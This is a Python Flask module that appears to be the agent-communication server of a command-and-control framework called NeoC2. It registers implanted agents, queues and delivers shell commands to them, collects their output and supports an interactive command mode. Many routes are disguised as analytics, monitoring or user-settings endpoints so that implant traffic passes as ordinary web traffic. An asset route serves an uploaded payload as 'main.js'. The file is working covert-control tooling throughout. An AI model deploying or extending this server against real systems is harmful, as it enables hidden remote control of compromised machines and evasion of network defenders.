import logging
from flask import Blueprint, request, jsonify, current_app
from datetime import datetime
import json
import uuid
import threading
import time
import re
from core.models import NeoC2DB
from teamserver.agent_manager import AgentManager

from core.payload_storage import get_uploaded_payload

bp = Blueprint('agent_comms', __name__)

logger = logging.getLogger(__name__)

agent_manager = None
endpoint_discovery = None

def init_agent_comms(existing_agent_manager=None):
    global agent_manager
    if existing_agent_manager:
        agent_manager = existing_agent_manager
        logger.info("Agent comms using shared AgentManager instance")
    else:
        try:
            from flask import g
            if hasattr(current_app, 'db') and current_app.db:
                agent_manager = AgentManager(current_app.db)
                logger.info("Agent comms using shared database from app context")
            else:
                from core.models import NeoC2DB
                db = NeoC2DB()
                agent_manager = AgentManager(db)
                logger.warning("Agent comms created new AgentManager instance")
        except:
            from core.models import NeoC2DB
            db = NeoC2DB()
            agent_manager = AgentManager(db)
            logger.warning("Agent comms created new AgentManager instance")
    
    try:
        import web.multi_port_endpoint_discovery as mp_module
        mp_module.agent_manager = agent_manager
        logger.info("Multi-port discovery initialized with shared AgentManager instance")
    except ImportError:
        logger.warning("Could not import multi_port_endpoint_discovery module")
    except Exception as e:
        logger.warning(f"Could not set agent_manager in multi_port_endpoint_discovery: {str(e)}")
    
    return agent_manager


def init_endpoint_discovery(app):
    global endpoint_discovery
    endpoint_discovery = EndpointAutoDiscovery(app)
    
    endpoint_discovery.scan_profiles_for_endpoints()
    
    endpoint_discovery.start()
    return endpoint_discovery


class EndpointAutoDiscovery:
    def __init__(self, app, scan_interval=30):  # Scan every 30 seconds
        self.app = app
        self.scan_interval = scan_interval
        self.running = False
        self.thread = None
        self.known_endpoints = {}  # Store known endpoints and their handlers
        self.logger = logging.getLogger(f'{__name__}.{self.__class__.__name__}')
    
    def start(self):
        if self.running:
            return
        
        self.running = True
        self.thread = threading.Thread(target=self._discovery_worker, daemon=True)
        self.thread.start()
        self.logger.info("Endpoint auto-discovery service started")
        self.logger.info(f"  - Scan interval: {self.scan_interval}s")
        self.logger.info(f"  - Background scanning: ENABLED")
    
    def stop(self):
        """Stop the background endpoint discovery service"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        self.logger.info("Endpoint auto-discovery service stopped")
    
    def _discovery_worker(self):
        """Background worker that scans for new profile endpoints"""
        scan_count = 0
        while self.running:
            try:
                new_endpoints = self.scan_profiles_for_endpoints()
                scan_count += 1
                
                if scan_count % 10 == 0:  # Log every 10 scans
                    self.logger.debug(f"Auto-discovery scan #{scan_count}, total known endpoints: {len(self.known_endpoints)}")
                
                time.sleep(self.scan_interval)
            except Exception as e:
                self.logger.error(f"Endpoint discovery worker error: {str(e)}")
                time.sleep(self.scan_interval)
    
    def scan_profiles_for_endpoints(self):
        try:
            with self.app.app_context():
                profiles = current_app.db.get_all_profiles()
                
                new_endpoints_found = 0
                
                for profile in profiles:
                    config = profile.get('config', {})
                    if isinstance(config, str):
                        try:
                            config = json.loads(config)
                        except:
                            continue
                    
                    endpoints = config.get('endpoints', {})
                    
                    register_endpoint = endpoints.get('register')
                    if register_endpoint:
                        if register_endpoint not in self.known_endpoints:
                            self.known_endpoints[register_endpoint] = {
                                'handler': self._handle_agent_register_wrapper,
                                'methods': ['POST'],
                                'source': 'profile_' + profile.get('name', 'unknown')
                            }
                            new_endpoints_found += 1
                    
                    tasks_endpoint = endpoints.get('tasks')
                    if tasks_endpoint:
                        if tasks_endpoint not in self.known_endpoints:
                            self.known_endpoints[tasks_endpoint] = {
                                'handler': self._handle_agent_tasks_wrapper,
                                'methods': ['GET'],
                                'has_agent_id': True,
                                'source': 'profile_' + profile.get('name', 'unknown')
                            }
                            new_endpoints_found += 1
                    
                    results_endpoint = endpoints.get('results')
                    if results_endpoint:
                        if results_endpoint not in self.known_endpoints:
                            self.known_endpoints[results_endpoint] = {
                                'handler': self._handle_agent_results_wrapper,
                                'methods': ['POST'],
                                'has_agent_id': True,
                                'source': 'profile_' + profile.get('name', 'unknown')
                            }
                            new_endpoints_found += 1
                            
                    interactive_endpoint = endpoints.get('interactive')
                    if interactive_endpoint:
                        if interactive_endpoint not in self.known_endpoints:
                            self.known_endpoints[interactive_endpoint] = {
                                'handler': self._handle_interactive_wrapper,
                                'methods': ['GET', 'POST'],
                                'has_agent_id': True,
                                'source': 'profile_' + profile.get('name', 'unknown')
                            }
                            new_endpoints_found += 1

                    interactive_status_endpoint = endpoints.get('interactive_status')
                    if interactive_status_endpoint:
                        if interactive_status_endpoint not in self.known_endpoints:
                            self.known_endpoints[interactive_status_endpoint] = {
                                'handler': self._handle_interactive_status_wrapper,
                                'methods': ['GET'],
                                'has_agent_id': True,
                                'source': 'profile_' + profile.get('name', 'unknown')
                            }
                            new_endpoints_found += 1

                try:
                    if hasattr(current_app, 'listener_manager') and current_app.listener_manager:
                        from listeners.http_listener_process import HTTPListenerProcessManager
                        if hasattr(current_app.listener_manager, 'http_listener_manager'):
                            http_manager = current_app.listener_manager.http_listener_manager
                            for listener_id, http_listener in http_manager.listeners.items():
                                if http_listener.is_running():
                                    try:
                                        listener_port = http_listener.port
                                        base_url = f"http://{http_listener.host}:{listener_port}"
                                        import requests
                                        response = requests.get(f"{base_url}/api/listener-info", timeout=5)
                                        if response.status_code == 200:
                                            listener_info = response.json()
                                            listener_endpoints = listener_info.get('endpoints', {})
                                            self.logger.info(f"Discovered endpoints from running listener {listener_info.get('name')}: {list(listener_endpoints.keys())}")
                                            
                                            for endpoint_name, endpoint_path in listener_endpoints.items():
                                                if endpoint_name == 'register':
                                                    if endpoint_path not in self.known_endpoints:
                                                        self.known_endpoints[endpoint_path] = {
                                                            'handler': self._handle_agent_register_wrapper,
                                                            'methods': ['POST'],
                                                            'source': f'listener_{listener_info.get("name", listener_id)[:8]}'
                                                        }
                                                        new_endpoints_found += 1
                                                elif endpoint_name == 'tasks':
                                                    if endpoint_path not in self.known_endpoints:
                                                        self.known_endpoints[endpoint_path] = {
                                                            'handler': self._handle_agent_tasks_wrapper,
                                                            'methods': ['GET'],
                                                            'has_agent_id': True,
                                                            'source': f'listener_{listener_info.get("name", listener_id)[:8]}'
                                                        }
                                                        new_endpoints_found += 1
                                                elif endpoint_name == 'results':
                                                    if endpoint_path not in self.known_endpoints:
                                                        self.known_endpoints[endpoint_path] = {
                                                            'handler': self._handle_agent_results_wrapper,
                                                            'methods': ['POST'],
                                                            'has_agent_id': True,
                                                            'source': f'listener_{listener_info.get("name", listener_id)[:8]}'
                                                        }
                                                        new_endpoints_found += 1
                                                elif endpoint_name == 'interactive':
                                                    if endpoint_path not in self.known_endpoints:
                                                        self.known_endpoints[endpoint_path] = {
                                                            'handler': self._handle_interactive_wrapper,
                                                            'methods': ['GET', 'POST'],
                                                            'has_agent_id': True,
                                                            'source': f'listener_{listener_info.get("name", listener_id)[:8]}'
                                                        }
                                                        new_endpoints_found += 1
                                                elif endpoint_name == 'interactive_status':
                                                    if endpoint_path not in self.known_endpoints:
                                                        self.known_endpoints[endpoint_path] = {
                                                            'handler': self._handle_interactive_status_wrapper,
                                                            'methods': ['GET'],
                                                            'has_agent_id': True,
                                                            'source': f'listener_{listener_info.get("name", listener_id)[:8]}'
                                                        }
                                                        new_endpoints_found += 1
                                    except Exception as e:
                                        self.logger.warning(f"Could not query running listener {listener_id} for endpoints: {str(e)}")
                except Exception as e:
                    self.logger.warning(f"Could not access listener manager for endpoint discovery: {str(e)}")

                if new_endpoints_found > 0:
                    self.logger.info(f"Auto-discovered {new_endpoints_found} new endpoints")
                    self.logger.info(f"  Total known endpoints: {len(self.known_endpoints)}")
                
                return new_endpoints_found
                
        except Exception as e:
            self.logger.error(f"Error scanning endpoints: {str(e)}")
            return 0
    
    def _handle_agent_register_wrapper(self):
        return handle_agent_register_common()
    
    def _handle_agent_tasks_wrapper(self, agent_id=None):
        return handle_agent_tasks_common(agent_id)
    
    def _handle_agent_results_wrapper(self, agent_id=None):
        return handle_agent_results_common(agent_id)

    def get_known_endpoints(self):
        endpoints_copy = {}
        for endpoint, endpoint_info in self.known_endpoints.items():
            endpoint_copy = {k: v for k, v in endpoint_info.items() if k != 'handler'}
            endpoint_copy['has_handler'] = 'handler' in endpoint_info  # Indicate that a handler exists
            endpoints_copy[endpoint] = endpoint_copy
        return endpoints_copy
        
    def _handle_interactive_wrapper(self, agent_id=None):
        return handle_interactive_communication(agent_id)

    def _handle_interactive_status_wrapper(self, agent_id=None):
        return handle_interactive_status(agent_id)



def get_profile_config_for_listener(listener_id):
    try:
        if not listener_id:
            return {}
            
        listener = current_app.db.get_listener(listener_id)
        if not listener:
            logger.debug(f"Listener {listener_id} not found")
            return {}
            
        profile_name = listener.get('profile_name', 'default')
        logger.debug(f"Listener {listener_id} uses profile: {profile_name}")
        
        profile = current_app.db.get_profile_by_name(profile_name)
        if not profile:
            logger.debug(f"Profile {profile_name} not found")
            return {}
            
        profile_config = profile.get('config', {})
        
        if isinstance(profile_config, str):
            try:
                profile_config = json.loads(profile_config)
            except json.JSONDecodeError:
                logger.debug("Profile config is invalid JSON")
                return {}
        elif not isinstance(profile_config, dict):
            logger.debug("Profile config is not a dict")
            return {}
            
        logger.debug(f"Profile config loaded successfully with keys: {list(profile_config.keys())}")
        return profile_config
        
    except Exception as e:
        logger.error(f"Error getting profile config: {str(e)}")
        return {}

def get_listener_port(listener_id):
    try:
        if not listener_id:
            return None
            
        listener = current_app.db.get_listener(listener_id)
        if not listener:
            logger.debug(f"Listener {listener_id} not found")
            return None
        
        return listener.get('port')
        
    except Exception as e:
        logger.error(f"Error getting listener port: {str(e)}")
        return None

def handle_agent_register_common():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        logger.debug(f"Registration request received at: {request.path}")
        
        hostname = data.get('hostname', 'unknown')
        os_info = data.get('os_info', 'unknown')
        user = data.get('user', 'unknown')
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            ip_address = forwarded_for.split(',')[0].strip()
        else:
            ip_address = request.headers.get('X-Real-IP') or request.remote_addr
        listener_id = data.get('listener_id', 'web_app_default')
        agent_id = data.get('agent_id')  # Get agent's pre-assigned ID
        
        provided_secret_key = data.get('secret_key')
        logger.debug(f"Agent info - Hostname: {hostname}, Listener: {listener_id}, Agent ID: {agent_id}, Secret Key Provided: {bool(provided_secret_key)}")
        
        profile_config = get_profile_config_for_listener(listener_id)
        
        if agent_id:
            if provided_secret_key:
                if not agent_manager._validate_agent_identity(agent_id, provided_secret_key):
                    logger.warning(f"Agent {agent_id} provided invalid secret key during check-in")
                    return jsonify({
                        'status': 'error',
                        'message': 'Invalid secret key provided'
                    }), 401
                else:
                    logger.debug(f"Agent {agent_id} secret key validated successfully")
            
            agent = agent_manager.get_agent(agent_id)
            if agent:
                logger.debug(f"Agent {agent_id} already registered, updating check-in")
                heartbeat_interval = profile_config.get('heartbeat_interval', agent.checkin_interval)
                jitter = profile_config.get('jitter', agent.jitter)
                
                agent_manager.db.execute('''
                    UPDATE agents 
                    SET status = 'active', hostname = ?, os_info = ?, user = ?, 
                        ip_address = ? 
                    WHERE id = ?
                ''', (hostname, os_info, user, ip_address, agent_id))
                
                agent_data = agent_manager.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (agent_id,))
                secret_key = agent_data['secret_key'] if agent_data else None
                
                return jsonify({
                    'status': 'success',
                    'agent_id': agent_id,
                    'message': 'Check-in successful',
                    'secret_key': secret_key,  # Include secret key in response
                    'checkin_interval': heartbeat_interval,
                    'jitter': jitter
                }), 200
            else:
                registered_agent_id = agent_manager.register_agent(
                    ip_address=ip_address,
                    hostname=hostname,
                    os_info=os_info,
                    user=user,
                    listener_id=listener_id,
                    agent_id=agent_id
                )
                
                agent_data = agent_manager.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (agent_id,))
                secret_key = agent_data['secret_key'] if agent_data else None
                
                agent_manager.db.execute('''
                    UPDATE agents 
                    SET status = 'active', hostname = ?, os_info = ?, user = ?, 
                        ip_address = ? 
                    WHERE id = ?
                ''', (hostname, os_info, user, ip_address, agent_id))
                
                return jsonify({
                    'status': 'success',
                    'agent_id': registered_agent_id,
                    'message': 'Agent registered successfully (pre-registered)',
                    'secret_key': secret_key,
                    'checkin_interval': profile_config.get('heartbeat_interval', 30),
                    'jitter': profile_config.get('jitter', 5)
                }), 201
        
        if not agent_id:
            return jsonify({
                'status': 'error',
                'message': 'Agent ID is required for registration'
            }), 400
        
        registered_agent_id = agent_manager.register_agent(
            ip_address=ip_address,
            hostname=hostname,
            os_info=os_info,
            user=user,
            listener_id=listener_id,
            agent_id=agent_id  # Pass the agent's pre-assigned ID
        )
        
        agent_data = agent_manager.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (registered_agent_id,))
        secret_key = agent_data['secret_key'] if agent_data else None
        
        heartbeat_interval = profile_config.get('heartbeat_interval', 30)
        jitter = profile_config.get('jitter', 5)
        
        logger.info(f"Agent registered: {registered_agent_id} with listener: {listener_id}")
        logger.debug(f"Using heartbeat: {heartbeat_interval}, jitter: {jitter}")
        
        agent_manager.db.execute('''
            UPDATE agents 
            SET status = 'active', hostname = ?, os_info = ?, user = ?, 
                ip_address = ? 
            WHERE id = ?
        ''', (hostname, os_info, user, ip_address, registered_agent_id))
        
        return jsonify({
            'status': 'success',
            'agent_id': registered_agent_id,
            'message': 'Agent registered successfully',
            'secret_key': secret_key,  # Include secret key in response for encrypted communication
            'checkin_interval': heartbeat_interval,
            'jitter': jitter
        }), 201
        
    except Exception as e:
        logger.error(f"Registration failed: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({
            'status': 'error',
            'message': f'Registration failed: {str(e)}'
        }), 500
        

def handle_agent_tasks_common(agent_id):
    try:
        logger.debug(f"Task request for agent {agent_id} at: {request.path}")
        
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            client_ip = forwarded_for.split(',')[0].strip()
        else:
            client_ip = request.headers.get('X-Real-IP') or request.remote_addr
        logger.debug(f"Client IP for agent {agent_id}: {client_ip}")
        
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            client_ip = forwarded_for.split(',')[0].strip()
        else:
            client_ip = request.headers.get('X-Real-IP') or request.remote_addr
        
        logger.debug(f"Task request for agent {agent_id} from IP: {client_ip}")
        agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
        if not agent:
            logger.debug(f"Agent {agent_id} not found")
            return jsonify({"status": "error", "message": "Agent not found"}), 404
        
        profile_config = get_profile_config_for_listener(agent.listener_id)
        
        interactive_task = agent_manager.get_interactive_task(agent_id)
        if interactive_task:
            logger.debug(f"Returning interactive task for agent {agent_id}")
            return jsonify({
                'status': 'success',
                'tasks': [interactive_task],
                'interactive_mode': True
            })
        
        tasks = agent_manager.get_tasks(agent_id)
        
        if not tasks:
            logger.debug(f"No tasks for agent {agent_id}")
            return jsonify({
                'status': 'success',
                'tasks': [],
                'interactive_mode': False
            })
        
        task_list = []
        for task in tasks:
            task_list.append({
                'id': task['id'],
                'command': task['command'],
                'created_at': task['created_at'].isoformat() if hasattr(task['created_at'], 'isoformat') else str(task['created_at'])
            })
        
        logger.info(f"Returning {len(task_list)} tasks for agent {agent_id}")
        return jsonify({
            'status': 'success',
            'tasks': task_list,
            'interactive_mode': False
        })
        
    except Exception as e:
        logger.error(f"Failed to get tasks for agent {agent_id}: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': f'Failed to get tasks: {str(e)}'
        }), 500

def handle_agent_results_common(agent_id):
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            client_ip = forwarded_for.split(',')[0].strip()
        else:
            client_ip = request.headers.get('X-Real-IP') or request.remote_addr
        logger.debug(f"Result submission for agent {agent_id} from IP: {client_ip} at: {request.path}")
        
        task_id = data.get('task_id')
        result = data.get('result', '')
        status = data.get('status', 'completed')
        
        if not task_id:
            return jsonify({
                'status': 'error',
                'message': 'Task ID is required'
            }), 400
        
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            client_ip = forwarded_for.split(',')[0].strip()
        else:
            client_ip = request.headers.get('X-Real-IP') or request.remote_addr
        
        logger.debug(f"Result submission for agent {agent_id} from IP: {client_ip}")
        agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
        if agent:
            profile_config = get_profile_config_for_listener(agent.listener_id)
            logger.debug(f"Agent {agent_id} belongs to listener: {agent.listener_id}")
        
        is_interactive = agent_manager.is_interactive_task(agent_id, task_id)
        
        if is_interactive:
            agent_manager.set_interactive_result(agent_id, task_id, result)
            logger.info(f"Interactive result received from agent {agent_id} for task {task_id}")
        else:
            agent_manager.add_result(agent_id, task_id, result)
            logger.info(f"Regular result received from agent {agent_id} for task {task_id}")
        
        return jsonify({
            'status': 'success',
            'message': 'Result received',
            'task_id': task_id
        })
        
    except Exception as e:
        logger.error(f"Failed to submit result from agent {agent_id}: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': f'Failed to submit result: {str(e)}'
        }), 500


@bp.route('/api/users/<agent_id>/profile', methods=['GET'])
def handle_common_custom_tasks_path(agent_id):
    return handle_agent_tasks_common(agent_id)

@bp.route('/api/users/<agent_id>/activity', methods=['POST'])
def handle_common_custom_results_path(agent_id):
    return handle_agent_results_common(agent_id)

@bp.route('/api/v1/health', methods=['POST'])
@bp.route('/api/users/register', methods=['POST'])
def handle_common_custom_register():
    return handle_agent_register_common()

@bp.route('/api/v1/updates', methods=['GET'])
@bp.route('/api/users/profile', methods=['GET'])
def handle_common_custom_tasks():
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({"status": "error", "message": "Agent ID required"}), 400
    return handle_agent_tasks_common(agent_id)

@bp.route('/api/v1/metrics', methods=['POST'])
@bp.route('/api/users/activity', methods=['POST'])
def handle_common_custom_results():
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({"status": "error", "message": "Agent ID required"}), 400
    return handle_agent_results_common(agent_id)



@bp.route('/api/users/<agent_id>/settings', methods=['GET', 'POST'])
def handle_disguised_interactive_path(agent_id):
    return handle_interactive_communication(agent_id)

@bp.route('/api/users/<agent_id>/status', methods=['GET'])
def handle_disguised_interactive_status_path(agent_id):
    return handle_interactive_status(agent_id)

@bp.route('/api/users/settings', methods=['GET', 'POST'])
def handle_disguised_interactive():
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({"status": "error", "message": "Agent ID required"}), 400
    return handle_interactive_communication(agent_id)

@bp.route('/api/users/status', methods=['GET'])
def handle_disguised_interactive_status():
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({"status": "error", "message": "Agent ID required"}), 400
    return handle_interactive_status(agent_id)

@bp.route('/api/assets/<path:filename>')
def handle_disguised_download(filename):
    try:
        from flask import send_file
        import os
        import os
        
        if filename == 'main.js':
            payload_data, payload_filename = get_uploaded_payload()
            if payload_data:
                logger.info(f"Serving uploaded payload: {payload_filename} ({len(payload_data)} base64 characters)")
                from flask import Response
                return Response(payload_data.strip(), mimetype='application/javascript')
            else:
                logger.warning("Request for main.js but no uploaded payload available")
                return jsonify({
                    "error": "No payload available. Please upload a payload using the Payload Upload tool.",
                    "instructions": "Upload your payload via the Tools > Payload Upload menu in the web interface"
                }), 404
        else:
            return jsonify({"error": "Asset not found"}), 404
    except Exception as e:
        logger.error(f"Download failed: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": f"Download failed: {str(e)}"}), 500

@bp.route('/api/analytics/track', methods=['POST'])
def handle_disguised_register_analytics():
    return handle_agent_register_common()

@bp.route('/api/monitoring/events', methods=['GET'])
def handle_disguised_tasks_monitoring():
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({"status": "error", "message": "Agent ID required"}), 400
    return handle_agent_tasks_common(agent_id)

@bp.route('/api/analytics/data', methods=['POST'])
def handle_disguised_results_analytics():
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({"status": "error", "message": "Agent ID required"}), 400
    return handle_agent_results_common(agent_id)




@bp.route('/api/agent/<agent_id>/interactive', methods=['GET', 'POST'])
def handle_interactive_communication(agent_id):
    try:
        forwarded_for = request.headers.get('X-Forwarded-For')
        if forwarded_for:
            client_ip = forwarded_for.split(',')[0].strip()
        else:
            client_ip = request.headers.get('X-Real-IP') or request.remote_addr
        logger.debug(f"Interactive communication request for agent {agent_id} from IP: {client_ip}")
        
        if request.method == 'GET':
            return handle_interactive_get(agent_id, client_ip)
        else:  # POST
            return handle_interactive_post(agent_id, client_ip)
            
    except Exception as e:
        logger.error(f"Interactive communication error for agent {agent_id}: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': f'Interactive communication failed: {str(e)}'
        }), 500

def handle_interactive_get(agent_id, client_ip=None):
    logger.debug(f"Interactive poll from agent {agent_id}")
    
    agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
    if not agent:
        return jsonify({"status": "error", "message": "Agent not found"}), 404
    
    # Check if agent is in interactive mode
    if not agent.interactive_mode:
        return jsonify({
            'status': 'success',
            'interactive_mode': False,
            'message': 'Not in interactive mode'
        })
    
    interactive_task = agent_manager.get_interactive_task(agent_id)
    if interactive_task:
        logger.info(f"Sending interactive command to agent {agent_id}: {interactive_task['command'][:50]}...")
        return jsonify({
            'status': 'success',
            'interactive_mode': True,
            'command': interactive_task['command'],
            'task_id': interactive_task['id'],
            'timestamp': interactive_task['created_at'].isoformat() if hasattr(interactive_task['created_at'], 'isoformat') else str(interactive_task['created_at'])
        })
    
    return jsonify({
        'status': 'success', 
        'interactive_mode': True,
        'command': None,
        'message': 'No pending interactive commands'
    })

def handle_interactive_post(agent_id, client_ip=None):
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No data provided"}), 400
    
    logger.debug(f"Interactive result from agent {agent_id}")
    
    task_id = data.get('task_id')
    result = data.get('result', '')
    
    if not task_id:
        return jsonify({
            'status': 'error',
            'message': 'Task ID is required'
        }), 400
    
    agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
    if not agent:
        logger.debug(f"Agent {agent_id} not found for interactive result")
        return jsonify({"status": "error", "message": "Agent not found"}), 404
    
    success = agent_manager.set_interactive_result(agent_id, task_id, result)
    
    if success:
        logger.info(f"Interactive result received from agent {agent_id} for task {task_id}")
        return jsonify({
            'status': 'success',
            'message': 'Interactive result received',
            'task_id': task_id
        })
    else:
        return jsonify({
            'status': 'error',
            'message': 'Failed to process interactive result'
        }), 500

def handle_interactive_status(agent_id):
    forwarded_for = request.headers.get('X-Forwarded-For')
    if forwarded_for:
        client_ip = forwarded_for.split(',')[0].strip()
    else:
        client_ip = request.headers.get('X-Real-IP') or request.remote_addr

    if agent_manager is None:
        logger.error("Agent manager not initialized when handling interactive status request")
        return jsonify({"status": "error", "message": "Server not properly initialized"}), 500

    try:
        agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
        if not agent:
            return jsonify({"status": "error", "message": "Agent not found"}), 404

        return jsonify({
            'status': 'success',
            'interactive_mode': agent.interactive_mode,
            'agent_id': agent_id,
            'has_pending_command': agent.interactive_task is not None
        })
    except Exception as e:
        logger.error(f"Error handling interactive status for agent {agent_id}: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({"status": "error", "message": f"Error retrieving agent status: {str(e)}"}), 500

@bp.route('/api/agent/<agent_id>/interactive/status', methods=['GET'])
def interactive_status_route(agent_id):
    return handle_interactive_status(agent_id)

@bp.route('/<path:full_path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def dynamic_endpoint_handler(full_path):
    logger.debug(f"Dynamic endpoint handler called for path: {full_path}, method: {request.method}")

    if endpoint_discovery and hasattr(endpoint_discovery, 'known_endpoints'):
        import re

        request_method = request.method

        logger.debug(f"Checking {len(endpoint_discovery.known_endpoints)} known endpoints...")

        for endpoint, endpoint_info in endpoint_discovery.known_endpoints.items():
            logger.debug(f"Checking endpoint: {endpoint}, methods: {endpoint_info.get('methods', ['GET', 'POST'])}")

            allowed_methods = endpoint_info.get('methods', ['GET', 'POST'])

            if request_method not in allowed_methods:
                logger.debug(f"Method {request_method} not allowed for {endpoint}, skipping")
                continue

            # Handle endpoints with agent_id placeholders - create a regex pattern
            if '{agent_id}' in endpoint:
                logger.debug(f"Processing endpoint with agent_id: {endpoint}")
                # Replace {agent_id} with a regex pattern to capture the agent ID
                # The endpoint from the profile includes leading slash, but full_path from Flask doesn't
                # So we need to handle this properly
                endpoint_without_slash = endpoint.lstrip('/')

                pattern = re.escape(endpoint_without_slash).replace(r'\{agent_id\}', r'([^/]+)')

                full_pattern = f'^{pattern}$'

                logger.debug(f"Trying pattern: {full_pattern} against path: {full_path}")
                match = re.match(full_pattern, full_path)
                if match:
                    agent_id = match.group(1)
                    handler = endpoint_info.get('handler')
                    logger.info(f"SUCCESS: Matched endpoint {endpoint} with agent_id: {agent_id} using pattern: {full_pattern}")

                    if not agent_id or '..' in agent_id or agent_id == '/':
                        logger.warning(f"Invalid agent_id extracted: {agent_id}")
                        continue  # Skip this match, try next endpoint

                    if handler:
                        try:
                            return handler(agent_id)
                        except Exception as e:
                            logger.error(f"Error in dynamic endpoint handler for {full_path}: {str(e)}")
                            import traceback
                            traceback.print_exc()
                            return jsonify({'status': 'error', 'message': str(e)}), 500
                else:
                    logger.debug(f"No match for pattern: {full_pattern}")

            else:
                logger.debug(f"Processing static endpoint: {endpoint}")
                endpoint_to_compare = endpoint.lstrip('/')
                if endpoint_to_compare == full_path:
                    handler = endpoint_info.get('handler')
                    logger.info(f"SUCCESS: Matched static endpoint {endpoint}")

                    if handler:
                        try:
                            return handler()
                        except Exception as e:
                            logger.error(f"Error in static endpoint handler for {full_path}: {str(e)}")
                            import traceback
                            traceback.print_exc()
                            return jsonify({'status': 'error', 'message': str(e)}), 500

    logger.warning(f"No matching endpoint found for path: {full_path} with method {request.method}")
    return jsonify({'status': 'error', 'message': 'Endpoint not found'}), 404
